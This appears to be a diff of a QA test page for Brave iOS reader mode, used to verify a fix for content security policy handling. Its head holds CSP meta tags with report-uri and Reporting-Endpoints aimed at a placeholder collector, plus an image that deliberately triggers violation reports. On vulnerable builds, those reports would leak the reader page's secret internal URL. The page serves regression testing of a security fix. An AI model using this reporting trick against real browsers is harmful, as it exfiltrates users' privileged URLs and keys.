@@ -3,49 +3,46 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Reader CSP Verification Article</title>
+<title>Reader CSP verification article</title>
 
-<!-- ============================================================
-     TEST CSP META TAGS
-     Replace <your-collector> with your request-logging endpoint
-     (webhook.site, RequestBin, or a tunnelled local server).
-     Do NOT point report-uri at github.io — it won't log anything.
-
-     Policy 1: has img-src  -> on a FIXED build only "img-src 'none'"
-               should reach the reader page; style-src/script-src/
-               report-uri/report-to must be dropped.
-     Policy 2: has NO img-src -> must be dropped entirely.
-     ============================================================ -->
+<!-- 
+  TEST CSP META TAGS
+  Replace COLLECTOR_URL with your HTTPS request-logging endpoint.
+  Do NOT point at github.io — it won't log anything.
+  
+  Policy 1: has img-src, style-src, script-src, report-uri, report-to
+  Policy 2: has NO img-src — only default-src and report-uri
+-->
 <meta http-equiv="Content-Security-Policy"
-  content="img-src 'none'; style-src 'none'; script-src 'none'; report-uri https://<your-collector>/leak; report-to leakgroup">
-<meta http-equiv="Reporting-Endpoints"
-  content="leakgroup=&quot;https://<your-collector>/leak&quot;">
+  content="img-src 'none'; style-src 'none'; script-src 'none'; report-uri COLLECTOR_URL/leak; report-to leakgroup">
 <meta http-equiv="Content-Security-Policy"
-  content="default-src 'none'; report-uri https://<your-collector>/leak2">
+  content="default-src 'none'; report-uri COLLECTOR_URL/leak2">
 </head>
 
 <body>
 <article>
-<h1>Reader CSP Verification Article</h1>
-<p>By QA Test Harness · Brave iOS Reader Mode</p>
+<h1>Reader CSP verification article</h1>
+<p>By QA test harness · Brave iOS reader mode</p>
 
-<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Example.jpg" alt="Example image used to violate img-src 'none'">
+<!-- Reporting-Endpoints in body per original bypass (CSP-4352) -->
+<meta http-equiv="Reporting-Endpoints"
+  content='leakgroup="COLLECTOR_URL/leak"'>
 
-<p>This page exists only to exercise Brave for iOS reader mode and the way content security policy meta tags are copied into the reader document. The reader mode button appears in the browser only after the page is scored as a genuine article, and that score is driven almost entirely by how much continuous prose the page contains, so this document deliberately includes several long paragraphs of ordinary text to push the readability score comfortably over its threshold.</p>
+<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Example.jpg" alt="Example image to violate img-src">
 
-<p>Readability algorithms of the Arc90 lineage walk the document looking for block level elements that hold substantial text, assign each of them a score that grows with the length of the text they contain, and then decide whether the page is worth offering in a stripped down reading view. Short pages, navigation heavy pages, and pages that are mostly links or images tend to fall below the threshold, which is exactly why an earlier version of this test page with only a placeholder line never produced a reader button on the phone.</p>
+<p>This page exists to exercise Brave iOS reader mode and how CSP meta tags are copied into the reader document. The reader mode button appears when the page scores high enough on readability, driven by continuous prose length.</p>
 
-<p>To make the behaviour deterministic, every paragraph here is written as full sentences rather than as a few words, because the scoring function rewards longer runs of text and effectively ignores very short fragments. By stacking a handful of paragraphs of this length one after another, the cumulative score climbs well past the minimum, and the browser reliably offers reader mode on both affected and fixed builds, which is what a clean regression test needs.</p>
+<p>Readability algorithms of the Arc90 lineage walk the document looking for block level elements that hold substantial text, assign each a score based on text length, then decide if a reading view is offered. Short pages, navigation-heavy pages, and pages mostly links or images fall below the threshold.</p>
 
-<p>Once reader mode is available, the interesting part of the test begins. The browser takes the content security policy meta tags that were present on the original page and decides which parts, if any, to carry forward into the reader document. On a build without the fix, far too much of the original policy survives, including directives that can send violation reports to a remote endpoint, and those reports can carry the privileged internal document URL along with its secret key.</p>
+<p>To make behaviour deterministic, paragraphs here are written as full sentences because the scoring function rewards longer text runs and ignores short fragments. By stacking paragraphs of this length, the score climbs past the minimum and the browser reliably offers reader mode.</p>
 
-<p>On a build that contains the fix, the handling is far more conservative. Only the image source directive is adopted from each policy, and any policy that does not contain an image source directive at all is dropped completely. That single change removes the reporting directives that made the original leak possible, so a correctly fixed build should never deliver a violation report to the collector configured in the meta tags above, no matter how the policy is phrased.</p>
+<p>Once reader mode is available, the browser takes CSP meta tags from the original page and decides which to carry forward into the reader document. On a vulnerable build, reporting directives survive and can send violation reports carrying the internal document URL with its secret key.</p>
 
-<p>The second paragraph of policy in the head of this document contains no image source directive whatsoever, which lets the tester confirm the drop behaviour directly. If any trace of that policy, or of its reporting endpoint, shows up in the reader document or arrives at the collector, the fix is not working as intended and the result should be recorded as a failure with the captured evidence attached to the report.</p>
+<p>The second paragraph of policy in the head contains no image source directive. This lets the tester confirm whether that policy is dropped. If any trace of that policy or its reporting endpoint appears in the reader document or arrives at the collector, record as failure with evidence attached.</p>
 
-<p>Finally, the image above intentionally violates an image source directive of none, which is the event that would cause a report to be generated in the first place. This gives the tester a natural trigger for the reporting path without any additional scripting, keeping the proof of concept benign and easy to reason about while still exercising exactly the code path that the security fix was written to close.</p>
+<p>The image above intentionally violates img-src 'none', which would cause a report to be generated. This gives a natural trigger for the reporting path without additional scripting.</p>
 
-<p>If you are reading this text inside a clean, stripped down reader view, then reader mode activated successfully and you can move on to inspecting the reader document head with Safari Web Inspector and watching the collector for any inbound violation reports. If you are still seeing the full styled page with no reader option, add more paragraphs of comparable length until the reader button appears.</p>
+<p>If you are reading this inside a stripped-down reader view, reader mode activated successfully. Inspect the reader document head with Safari Web Inspector and watch the collector for inbound violation reports.</p>
 </article>
 </body>
 </html>
